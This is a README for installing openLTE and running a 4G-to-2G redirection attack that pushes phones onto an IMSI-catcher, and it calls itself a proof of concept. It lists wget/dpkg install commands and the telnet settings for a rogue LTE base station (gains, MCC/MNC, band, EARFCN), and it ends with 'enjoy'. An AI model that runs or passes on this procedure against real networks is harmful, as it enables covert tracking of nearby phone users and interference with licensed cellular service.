# openlte_redirection_quickinstall
* Installation
Follow this readme :  
https://github.com/bbaranoff/openLTE2GSM/
  
The bash script is : 
sudo apt update
wget https://github.com/bbaranoff/openLTE2GSM/releases/download/v0.1/uhd_20211230-1_amd64.deb
wget https://github.com/bbaranoff/openLTE2GSM/releases/download/v0.1/soapysdr_20211230-1_amd64.deb
wget https://github.com/bbaranoff/openLTE2GSM/releases/download/v0.1/bladerf_20211230-1_amd64.deb
wget https://github.com/bbaranoff/openLTE2GSM/releases/download/v0.1/soapybladerf_20211230-1_amd64.deb
wget https://github.com/bbaranoff/openLTE2GSM/releases/download/v0.1/soapyuhd_20211230-1_amd64.deb
wget https://github.com/bbaranoff/openLTE2GSM/releases/download/v0.1/gnuradio_20211230-1_amd64.deb
wget https://github.com/bbaranoff/openLTE2GSM/releases/download/v0.1/gr-osmosdr_20211230-1_amd64.deb
wget https://github.com/bbaranoff/openLTE2GSM/releases/download/v0.1/polarssl_20211230-1_amd64.deb
wget https://github.com/bbaranoff/openLTE2GSM/releases/download/v0.1/openlte_20211230-1_amd64.deb
dpkg -i *.deb
export LD_LIBRARY_PATH=/usr/local/lib/
sudo ldconfig
sudo apt install libboost-date-time1.67.0 libboost-filesystem1.67.0 libboost-regex1.67.0 libboost-serialization1.67.0 libboost-serialization1.67.0
echo "Done !!!!"


* Installing 2G IMSI-Catcher
Then build 2G IMSI-Catcher  
Build IMSI-catcher  

* Testing the attack
Running  
Phone in 2G/3G/4G mode  
This article is in progress and is just a PoC  
The attack step are run the IMSI-catcher into arfcn 514 follow (see Build IMSI-catcher)  
run the 4G redirector as follow  
  
Shell #1  
LTE_fdd_enodeb

Shell #2  
telnet localhost 30000  
write rx_gain 30  
write tx_gain 80  
write mcc 215  
write mnc 15  
write band 7  
write dl_earfcn 3350  
(change with your ue values be careful that the earfcn is in the band)  
  
Then switch the phone in airplane mode and in  localhost:30000 (Shell #2) :  
start  
  
wait… and when you have “ok” answer in shell #2 remove airplane mode and … enjoy !

* Video explaining : 
https://www.youtube.com/watch?v=CL4THUyUSDc&t=34s&pp=ygUhbHRlIHJlZGlyZWN0aW9uIGJhc3RpZW4gYmFyYW5vZmYg  
https://www.youtube.com/shorts/j5cs28u4DAo  
https://www.youtube.com/watch?v=GmPN6CblvaQ&pp=ygUhbHRlIHJlZGlyZWN0aW9uIGJhc3RpZW4gYmFyYW5vZmYg
